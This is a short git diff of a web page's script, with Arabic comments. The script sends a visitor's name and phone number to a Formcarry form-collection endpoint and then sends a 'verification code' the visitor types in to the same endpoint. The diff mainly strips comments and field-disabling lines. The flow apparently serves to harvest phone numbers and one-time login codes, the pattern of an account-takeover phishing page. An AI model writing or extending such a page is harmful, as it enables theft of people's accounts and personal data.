@@ -103,7 +103,7 @@
 
   <script>
     const formcarryURL = "https://formcarry.com/s/pHHZOWhpgsB"; // ← استبدل هذا بالرابط الخاص بك
-    let step = 1; // المرحلة الحالية: 1 لإرسال البيانات، 2 للتحقق من الكود
+    let step = 1;
 
     function handleAction() {
       if (step === 1) {
@@ -120,7 +120,6 @@
           return;
         }
 
-        // إرسال الاسم ورقم الهاتف إلى Formcarry
         fetch(formcarryURL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -150,7 +149,6 @@
           return;
         }
 
-        // إرسال الكود
         fetch(formcarryURL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -159,12 +157,6 @@
           })
         }).then(() => {
           alert("تم تأكيد الكود بنجاح ✅");
-
-          // إغلاق الحقول بعد التأكيد
-          document.getElementById("fullName").disabled = true;
-          document.getElementById("myPhone").disabled = true;
-          document.getElementById("codeInput").disabled = true;
-          document.getElementById("actionBtn").disabled = true;
           document.getElementById("actionBtn").innerText = "تم التحقق";
         }).catch((error) => {
           alert("فشل في إرسال الكود. حاول مرة أخرى.");
